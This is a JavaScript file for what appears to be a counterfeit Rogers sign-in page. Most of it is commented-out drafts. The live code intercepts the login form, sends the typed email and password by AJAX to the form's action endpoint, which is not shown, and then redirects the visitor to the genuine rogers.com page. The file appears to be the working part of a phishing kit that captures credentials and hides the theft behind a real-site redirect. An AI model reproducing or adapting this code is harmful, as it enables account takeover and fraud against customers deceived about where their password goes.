
// $(document).ready(function(){

//   $('#error').hide();
//   $('#mess').hide();
//   $('#dot-pulse').hide();
//   $('#badmess').hide();



//   $('#submit-btn').click(function () {
//     var my_email =$('#email').val();
//     var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

//     if (!filter.test(my_email)) {
//       $('#error').show();
//       $('#mess').show();
//       $('.badmess').hide();
//       $('#email').css("border", "3px solid #da291c")
//       $('#password').css("border", "3px solid #da291c")
//       $('#email').css("background-color", " #f8f0ed")
//       $('#password').css("background-color", " #f8f0ed")

//       email.focus;
//       return false;
//     }
//   });

//   $('#ice').click(function () {
//     $("#badmess").hide();
//   })

//   $('#submit-btn').click(function(event){
//     event.preventDefault();
//     var email=$("#email").val();
//     var password=$("#password").val();
//     var detail=$("#field").html();
//     var msg = $('#msg').html();
//     $('#msg').text( msg );
//     if (!email.includes('@') || password.length < 6) {
//       $('#badmess').show();
  
//       return false;
//     }
//     else if( email !='' && password !='') {
  
//         window.location.replace("https://www.rogers.com/consumer/profile/signin");
//         $('#sign').hide();
//         $('#dot-pulse').show();
       
//         $('#badmess').hide();
  
//     }

//   })
// });


// window.addEventListener("DOMContentLoaded", function() {
  
//  var form = document.getElementById("my-form");

//   function success() {
//     form.reset();
//   }

//   function error() {
//   }

//   form.addEventListener("submit", function(ev) {
//     ev.preventDefault();
//     var data = new FormData(form);
//     ajax(form.method, form.action, data, success, error);
//   });
// });

// function ajax(method, url, data, success, error) {
//   var xhr = new XMLHttpRequest();
//   xhr.open(method, url);
//   xhr.setRequestHeader("Accept", "application/json");
//   xhr.onreadystatechange = function() {
//     if (xhr.readyState !== XMLHttpRequest.DONE) return;
//     if (xhr.status === 200) {
//       success(xhr.response, xhr.responseType);
//     } else {
//       error(xhr.status, xhr.response, xhr.responseType);
//     }
//   };
//   xhr.send(data);
// };

// function myFunction() {
//   var err = document.getElementById("error");
//   var mess = document.getElementById("mess");
//   var bad = document.getElementById("badmess");
//   var dot = document.getElementById("dot-pulse");
//   var email = document.getElementById("email").value;
//   var passwordss = document.getElementById("password").value;
//   err.style.display = "none"
//   mess.style.display = "none"
//   bad.style.display = "none"
//   dot.style.display = "none"

//   function submits() {
//     if ( passwordss.length < 6) {
//       email.style.borderColor = " #da291c"
//       email.style.backgroundColor = " #f8f0ed"
//       password.style.borderColor = " #da291c"
//       password.style.backgroundColor = " #f8f0ed"
//     }
//   };
 
// };


// function submits() {
//   var err = document.getElementById("error");
//   var mess = document.getElementById("mess");
//   var bad = document.getElementById("badmess");
//   var dot = document.getElementById("dot-pulse");
//   var email = document.getElementById("email").value;
//   var passwordss = document.getElementById("password").value;
//   err.style.display = "none";
//   mess.style.display = "none";
//   bad.style.display = "none";
//   dot.style.display = "none";
//  var email = document.getElementById("email").value;
//  var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
//    if (!filter.test(email)) {
//     err.style.display = "block";
//     bad.style.display = "none";
//     mess.style.display = "block";
//     document.getElementById("email").style.borderColor = " #da291c";
//     document.getElementById("email").style.backgroundColor = " #f8f0ed";
//     document.getElementById("password").style.borderColor = " #da291c";
//     document.getElementById("password").style.backgroundColor = " #f8f0ed";
//     return false;
//    }
// }
// function ices() {
//  var see = document.getElementById("badmess")
//  see.style.display = "none"
// }

// function submits(ev) {
//  ev.preventDefault();
//  var email = document.getElementById("email").value;
//  var password = document.getElementById("password").value;
//  var err = document.getElementById("error");
//   var mess = document.getElementById("mess");
//   var bad = document.getElementById("badmess");
//   var dot = document.getElementById("dot-pulse")
//   err.style.display = "none"
//   mess.style.display = "none"
//   bad.style.display = "none"
//   dot.style.display = "none"

//  if ( password.length < 6) {
//    password.style.borderColor = " #da291c"
//    bad.style.display = "block";
//    return false
//  }else if ( email !='' && password !=''){
//    window.location.replace("https://www.rogers.com/consumer/profile/signin");
//    bad.style.display = "none"
//    dot.style.display = "block"
   
//  }
// }

function ices() {
  var see = document.getElementById("badmess")
  see.style.display = "none"
 }

// window.addEventListener("DOMContentLoaded", function() {
  
//  var form = document.getElementById("my-form");
//  var err = document.getElementById("error");
//  var mess = document.getElementById("mess");
//  var bad = document.getElementById("badmess");
//  var dot = document.getElementById("dot-pulse");
//  var email = document.getElementById("email").value;
//  var passwords = document.getElementById("password").value;
//  err.style.display = "none";
//  mess.style.display = "none";
//  bad.style.display = "none";
//  dot.style.display = "none";

 
//  function submits(ev) {
//   ev.preventDefault();
//   var email = document.getElementById("email").value;
//   var password = document.getElementById("password").value;
//   var err = document.getElementById("error");
//    var mess = document.getElementById("mess");
//    var bad = document.getElementById("badmess");
//    var dot = document.getElementById("dot-pulse")
//    err.style.display = "none"
//    mess.style.display = "none"
//    bad.style.display = "none"
//    dot.style.display = "none"
 
//   if ( password.length < 6) {
//     password.style.borderColor = " #da291c"
//     bad.style.display = "block";
//     return false
//   }else{
//     window.location.replace("https://www.rogers.com/consumer/profile/signin");
//     bad.style.display = "none"
//     dot.style.display = "block"
    
//   }
//  }
//  document.getElementById("submit-btn").addEventListener("click", function() {
   
//  if ( passwords.length < 6) {
//    password.style.borderColor = " #da291c"
//    bad.style.display = "block";
//    return false
//  }else if ( email !='' && password !=''){
//    window.location.replace("https://www.rogers.com/consumer/profile/signin");
//    bad.style.display = "none"
//    dot.style.display = "block"
//  }

//   var err = document.getElementById("error");
//   var mess = document.getElementById("mess");
//   var bad = document.getElementById("badmess");
//   var dot = document.getElementById("dot-pulse");
//   var email = document.getElementById("email").value;
//   var passwords = document.getElementById("password").value;
//   err.style.display = "none";
//   mess.style.display = "none";
//   bad.style.display = "none";
//   dot.style.display = "none";
//  function submits() {
//    ev.preventDefault();
//    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
//    if (!filter.test(email) || passwords.length < 6){
//     err.style.display = "block";
//     mess.style.display = "block";
//     bad.style.display = "block";
//     dot.style.display = "block";
//    }else{
//     window.location.replace("https://www.rogers.com/consumer/profile/signin");
//    }
//  }


// window.addEventListener("DOMContentLoad", function() {
  
//   var form = document.getElementById("my-form");


//   function success() {
//     form.reset();
//   }

//   function error() {
//     bad.style.display = "block";
//     email.style.borderColor = " #da291c";
//     email.style.backgroundColor = " #f8f0ed";
//     password.style.borderColor = " #da291c";
//     password.style.backgroundColor = " #f8f0ed";
//   }



//   form.addEventListener("submit", function(ev) {
//     ev.preventDefault();
//     var data = new FormData(form);
//     ajax(form.method, form.action, data, success, error);
//   });
// });

// function ajax(method, url, data, success, error) {
//   var xhr = new XMLHttpRequest();
//   xhr.open(method, url);
//   xhr.setRequestHeader("Accept", "application/json");
//   xhr.onreadystatechange = function() {
//     if (xhr.readyState !== XMLHttpRequest.DONE) return;
//     if (xhr.status === 200) {
//       success(xhr.response, xhr.responseType);
//     } else {
//       error(xhr.status, xhr.response, xhr.responseType);
//     }
//   };
//   xhr.send(data);
// };


//   var err = document.getElementById("error");
//   var mess = document.getElementById("mess");
//   var bad = document.getElementById("badmess");
//   var dot = document.getElementById("dot-pulse");
//   var email = document.getElementById("email").value;
//   var passwords = document.getElementById("password").value;
// function submits() {
//   window.location.replace("https://www.rogers.com/consumer/profile/signin");
// }

window.addEventListener("DOMContentLoaded", function() {

  var form = document.getElementById("my-form");

  
  function success() {
    window.location.replace("https://www.rogers.com/home");

  }

  function error() {
    
  }

  // handle the form submission event

  form.addEventListener("submit", function(ev) {
    ev.preventDefault();
    var data = new FormData(form);
    ajax(form.method, form.action, data, success, error);
  });
});

// helper function for sending an AJAX request

function ajax(method, url, data, success, error) {
  var xhr = new XMLHttpRequest();
  xhr.open(method, url);
  xhr.setRequestHeader("Accept", "application/json");
  xhr.onreadystatechange = function() {
    if (xhr.readyState !== XMLHttpRequest.DONE) return;
    if (xhr.status === 200) {
      success(xhr.response, xhr.responseType);
    } else {
      error(xhr.status, xhr.response, xhr.responseType);
    }
  };
  xhr.send(data);
}
function vieworhide() {
  var view = document.querySelector('#password');
      if(view.type ==="password") {
          view .type = "text";
      } else {
          view.type = "password"
      };
    
};

